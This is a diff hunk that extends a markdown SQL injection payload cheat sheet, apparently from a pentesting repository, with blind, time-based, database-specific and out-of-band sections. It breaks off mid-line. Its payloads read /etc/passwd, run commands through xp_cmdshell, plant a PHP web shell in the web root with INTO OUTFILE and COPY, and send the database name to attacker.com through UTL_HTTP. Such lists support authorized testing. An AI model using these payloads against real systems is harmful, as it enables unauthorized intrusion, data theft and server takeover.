@@ -36,4 +36,50 @@ EXTRACTVALUE(rand(),concat(0x3a,(select database())))
 
 ```
 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'
-AND ASCII(SUBSTRING((
+AND ASCII(SUBSTRING((SELECT database()),1,1))>100
+```
+
+## Time-Based Blind SQLi
+
+```
+IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
+; WAITFOR DELAY '0:0:5' --
+OR (SELECT * FROM (SELECT(SLEEP(5)))a)
+```
+
+## Database-Specific Payloads
+
+### MySQL
+```
+@@version
+LOAD_FILE('/etc/passwd')
+INTO OUTFILE '/var/www/html/shell.php'
+CONNECTION_ID()
+```
+
+### MSSQL
+```
+@@SERVERNAME
+xp_cmdshell('whoami')
+WAITFOR DELAY '0:0:5'
+```
+
+### Oracle
+```
+(SELECT banner FROM v$version WHERE rownum=1)
+UTL_HTTP.REQUEST('http://attacker.com')
+DBMS_LOCK.SLEEP(5)
+```
+
+### PostgreSQL
+```
+current_database()
+pg_sleep(5)
+COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'
+```
+
+## Out-of-Band Techniques
+
+```
+||UTL_HTTP.request('http://attacker.com/'||database())--
+EXEC
